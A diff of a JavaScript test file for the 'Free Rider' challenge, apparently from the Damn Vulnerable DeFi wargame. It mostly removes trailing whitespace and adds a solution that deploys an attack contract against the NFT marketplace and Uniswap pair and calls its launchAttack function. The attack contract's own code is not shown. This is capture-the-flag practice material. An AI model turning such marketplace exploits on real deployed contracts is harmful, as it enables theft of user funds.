@@ -15,7 +15,7 @@ describe('[Challenge] Free Rider', function () {
     const NFT_PRICE = 15n * 10n ** 18n;
     const AMOUNT_OF_NFTS = 6;
     const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
-    
+
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
 
     const BOUNTY = 45n * 10n ** 18n;
@@ -46,7 +46,7 @@ describe('[Challenge] Free Rider', function () {
             uniswapFactory.address,
             weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // The function takes care of deploying the pair automatically
         await token.approve(
@@ -62,7 +62,7 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
         uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
             await uniswapFactory.getPair(token.address, weth.address)
@@ -99,13 +99,23 @@ describe('[Challenge] Free Rider', function () {
         // Deploy devs' contract, adding the player as the beneficiary
         devsContract = await (await ethers.getContractFactory('FreeRiderRecovery', devs)).deploy(
             player.address, // beneficiary
-            nft.address, 
+            nft.address,
             { value: BOUNTY }
         );
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("Bounty balance :", await ethers.provider.getBalance(devsContract.address));
+        console.log("NFT marketplace balance:", await ethers.provider.getBalance(marketplace.address));
+        console.log("Player ETH balance:", await ethers.provider.getBalance(player.address));
+        attacker = await (await ethers.getContractFactory('FreeRiderNFTMarketplaceAttack', player)).deploy(
+            marketplace.address,
+            uniswapPair.address,
+            devsContract.address
+        );
+        await attacker.connect(player).launchAttack(NFT_PRICE, { value: PLAYER_INITIAL_ETH_BALANCE - 5n * 10n ** 16n });
+        console.log("Player ETH balance:", await ethers.provider.getBalance(player.address));
     });
 
     after(async function () {
